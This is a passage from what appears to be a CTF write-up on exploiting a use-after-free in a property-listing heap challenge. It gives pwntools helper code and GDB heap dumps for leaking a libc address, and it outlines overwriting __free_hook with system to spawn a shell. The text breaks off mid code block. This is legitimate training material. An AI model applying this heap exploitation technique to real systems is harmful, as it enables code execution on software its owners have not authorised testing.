<li>There is Use-After-Free (UAF) bug on the <code>comment</code>, where we can see the freed chunk, and edit it via <code>edit_property</code></li>
</ul>
<p>Seems like the rough plan is pretty clear. We can leak libc address by leveraging the UAF bug in the <code>comment</code> objectt. And then we need to be able to overwrite <code>__free_hook</code> by <code>system</code> to trigger a shell.</p>
<h3 id="solution">Solution <a href="#solution" class="anchor">#</a></h3>
<p>Okay, so now I will explain my solution on this challenge. Let&rsquo;s define helper in our script first to help our life easier.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">add_property</span>(r, lsn, sn, lc, comment<span style="color:#555">=</span><span style="color:#c30">&#39;&#39;</span>):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the house number: &#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">10</span>)<span style="color:#555">.</span>encode()) <span style="color:#09f;font-style:italic"># Isn&#39;t useful. Just set any value.</span>
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;What is the length of the street name: &#39;</span>, <span style="color:#366">str</span>(lsn)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the street name: &#39;</span>, sn)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;What is the price of the property?: &#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">10</span>)<span style="color:#555">.</span>encode()) <span style="color:#09f;font-style:italic"># Isn&#39;t useful. Just set any value.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> lc <span style="color:#555">==</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;n&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;What is the length of the comment?: &#39;</span>, <span style="color:#366">str</span>(lc)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the comment: &#39;</span>, comment)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">edit_property</span>(r, lsn, sn, lc, comment<span style="color:#555">=</span><span style="color:#c30">&#39;&#39;</span>, change_comment<span style="color:#555">=</span><span style="color:#069;font-weight:bold">False</span>, is_free_hook_overwritted<span style="color:#555">=</span><span style="color:#069;font-weight:bold">False</span>):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the house number? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;n&#39;</span>) <span style="color:#09f;font-style:italic"># Isn&#39;t useful. No need to edit.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> lsn <span style="color:#555">==</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the street? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;n&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the street? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the new street name length: &#39;</span>, <span style="color:#366">str</span>(lsn)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the new street name: &#39;</span>, sn)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the price of the property? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;n&#39;</span>) <span style="color:#09f;font-style:italic"># Isn&#39;t useful. No need to edit.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> lc <span style="color:#555">==</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>        r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the comment? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;n&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> <span style="color:#000;font-weight:bold">not</span> change_comment:
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;What is the length of the comment?: &#39;</span>, <span style="color:#366">str</span>(lc)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the comment: &#39;</span>, comment)
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Would you like to change the comment? [y/n]: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the new comment length: &#39;</span>, <span style="color:#366">str</span>(lc)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span> is_free_hook_overwritted:
</span></span><span style="display:flex;"><span>                <span style="color:#09f;font-style:italic"># No need to enter new comment, as we have overwritten it with system</span>
</span></span><span style="display:flex;"><span>                <span style="color:#069;font-weight:bold">return</span>
</span></span><span style="display:flex;"><span>            r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter the new comment: &#39;</span>, comment)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">remove_property</span>(r):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">show_property</span>(r):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()
</span></span><span style="display:flex;"><span>    comment <span style="color:#555">=</span> r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()<span style="color:#555">.</span>split(<span style="color:#c30">b</span><span style="color:#c30">&#39;: &#39;</span>)[<span style="color:#f60">1</span>] <span style="color:#09f;font-style:italic"># We only care the comment value</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> comment
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">change_username</span>(r, ln, name):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;What is the length of your new name?: &#39;</span>, <span style="color:#366">str</span>(ln)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter your new name: &#39;</span>, name)
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="part-1-leak-libc-address">Part 1: Leak Libc Address <a href="#part-1-leak-libc-address" class="anchor">#</a></h4>
<p>Okay, so now let&rsquo;s try to fire up our GDB to have a better visualization on the heap. Let&rsquo;s start the program by initializing our name</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># After first connection, by default the binary will call malloc(0x40)</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># and use this heap chunk for property variable</span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter your name: &#39;</span>, p64(<span style="color:#f60">0xdeadbeef</span>))
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the heap after we initialize our name</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x55802d04d290	0x0000000000000000	0x0000000000000081	................
</span></span><span style="display:flex;"><span>0x55802d04d2a0	0x00000000deadbeef	0x000000000000000a	................
</span></span><span style="display:flex;"><span>0x55802d04d2b0	0x0000000000000000	0x0000000000000000	................
</span></span><span style="display:flex;"><span>0x55802d04d2c0	0x0000000000000000	0x0000000000000000	................
</span></span><span style="display:flex;"><span>0x55802d04d2d0	0x0000000000000000	0x0000000000000000	................
</span></span><span style="display:flex;"><span>0x55802d04d2e0	0x0000000000000000	0x0000000000000000	................
</span></span><span style="display:flex;"><span>0x55802d04d2f0	0x0000000000000000	0x0000000000000000	................
</span></span><span style="display:flex;"><span>0x55802d04d300	0x0000000000000000	0x0000000000000000	................
</span></span><span style="display:flex;"><span>0x55802d04d310	0x0000000000000000	0x0000000000020cf1	................	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we need to free a chunk to unsorted bin. Simply malloc a large chunk and free it.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x10</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0x427</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>)
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>remove_property(r)
</span></span></code></pre></td></tr></table>
</div>
</div><p>What we want to achieve on here is:</p>
<ul>
<li>Create a large chunk in <code>comment</code></li>
<li>Alloc a new chunk below it to prevent consolidation</li>
<li>Freed all the object</li>
</ul>
<p>After freed all the object, we will have:</p>
<ul>
<li>1 chunk inside unsorted_bin (<code>comment</code>)</li>
<li>1 chunk inside tcache[0x20] (<code>added street</code>)</li>
<li>1 chunk inside tcache[0x30] (<code>edited street</code>)</li>
<li>1 chunk inside tcache[0x50] (<code>property</code>)</li>
</ul>
<p>Below is the current heap and bins:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x55802d04d290	0x0000000000000000	0x0000000000000081
</span></span><span style="display:flex;"><span>0x55802d04d2a0	0x00000000deadbeef	0x000000000000000a
</span></span><span style="display:flex;"><span>0x55802d04d2b0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d2c0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d2d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d2e0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d2f0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d300	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d310	0x0000000000000000	0x0000000000000051
</span></span><span style="display:flex;"><span>0x55802d04d320	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x50][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d330	0x4024000000000000	0x000000000000000a
</span></span><span style="display:flex;"><span>0x55802d04d340	0x0000000000000000	0x0000000000000020
</span></span><span style="display:flex;"><span>0x55802d04d350	0x000055802d04d390	0x0000000000000427
</span></span><span style="display:flex;"><span>0x55802d04d360	0x0000000000000000	0x0000000000000021
</span></span><span style="display:flex;"><span>0x55802d04d370	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x20][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d380	0x0000000000000000	0x0000000000000431	 &lt;-- unsortedbin[all][0]
</span></span><span style="display:flex;"><span>0x55802d04d390	0x00007fe1975bfbe0	0x00007fe1975bfbe0
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x55802d04d7b0	0x0000000000000430	0x0000000000000030
</span></span><span style="display:flex;"><span>0x55802d04d7c0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x30][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d7d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d7e0	0x0000000000000000	0x0000000000020821	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>It&rsquo;s time to leak the libc address.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
